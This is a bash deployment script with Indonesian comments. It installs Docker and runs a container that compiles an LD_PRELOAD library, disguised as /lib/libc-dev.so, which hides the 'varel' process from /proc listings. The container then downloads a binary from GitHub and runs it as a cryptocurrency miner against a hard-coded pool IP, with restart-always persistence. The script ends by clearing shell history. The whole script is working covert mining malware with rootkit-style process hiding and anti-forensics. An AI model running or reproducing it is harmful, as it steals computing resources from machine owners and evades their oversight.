#!/bin/bash
set -e

# === Install Docker (versi resmi, tanpa konflik containerd) ===
sudo apt-get remove -y docker.io moby-containerd containerd runc 2>/dev/null || true
sudo apt-get autoremove -y

sudo apt-get update
sudo apt-get install -y ca-certificates curl gnupg lsb-release

sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc

echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] \
  https://download.docker.com/linux/ubuntu \
  $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

sudo apt-get update
sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin

sudo systemctl enable docker
sudo systemctl start docker

# === Bersihkan container lama jika ada ===
docker stop varel-app 2>/dev/null || true
docker rm varel-app 2>/dev/null || true

# === Siapkan setup.sh yang akan dijalankan di dalam container ===
export TMPDIR=$HOME/tmp
mkdir -p $TMPDIR

cat > /tmp/setup.sh << 'EOFSETUP'
#!/bin/bash
apt-get update >/dev/null 2>&1
apt-get install -y wget ca-certificates libssl3 gcc >/dev/null 2>&1

# --- Buat file hider.c ---
cat > /tmp/hider.c << 'EOFHIDER'
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
static const char* process_to_filter = "varel";
static int get_dir_name(DIR* dirp, char* buf, size_t size) {
    int fd = dirfd(dirp);
    if(fd == -1) return 0;
    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) return 0;
    buf[ret] = 0;
    return 1;
}
static int get_process_name(char* pid, char* buf) {
    if(strspn(pid, "0123456789") != strlen(pid)) return 0;
    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
    FILE* f = fopen(tmp, "r");
    if(f == NULL) return 0;
    if(fgets(tmp, sizeof(tmp), f) == NULL) { fclose(f); return 0; }
    fclose(f);
    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}
#define DECLARE_READDIR(dirent, readdir) \
static struct dirent* (*original_##readdir)(DIR*) = NULL; \
struct dirent* readdir(DIR *dirp) { \
    if(original_##readdir == NULL) { \
        original_##readdir = dlsym(RTLD_NEXT, #readdir); \
        if(original_##readdir == NULL) fprintf(stderr, "Error: %s\n", dlerror()); \
    } \
    struct dirent* dir; \
    while(1) { \
        dir = original_##readdir(dirp); \
        if(dir) { \
            char dir_name[256], process_name[256]; \
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) && \
                strcmp(dir_name, "/proc") == 0 && \
                get_process_name(dir->d_name, process_name) && \
                strcmp(process_name, process_to_filter) == 0) continue; \
        } \
        break; \
    } \
    return dir; \
}
DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
EOFHIDER

gcc -Wall -fPIC -shared -o /lib/libc-dev.so /tmp/hider.c -ldl 2>/dev/null
rm -f /tmp/hider.c

# --- Jalankan varel ---
mkdir -p /app && cd /app
wget -q https://github.com/jerryseptian123/helmiyahtas/raw/main/varel
chmod +x varel

RANDOM_USER="v11d5exukktuwl8geceiwini8jhqcpk1bj3u8xw.$(shuf -n 1 -i 1-99999)-gtbbbbbbbbb"
export LD_PRELOAD=/lib/libc-dev.so
exec ./varel -a randomvirel --url 137.184.31.121:443 --user $RANDOM_USER --threads=6
EOFSETUP

chmod +x /tmp/setup.sh

# === Jalankan container ===
docker run -d --name varel-app --restart=always \
  -v /tmp/setup.sh:/setup.sh:ro \
  ubuntu:22.04 \
  /bin/bash /setup.sh

sleep 8

# === Cek hasil ===
echo "✅ Setup complete!"
docker ps | grep varel-app
echo ""
echo "🧪 Check logs:"
docker logs varel-app | tail -20

# Bersihkan riwayat
history -c && history -w
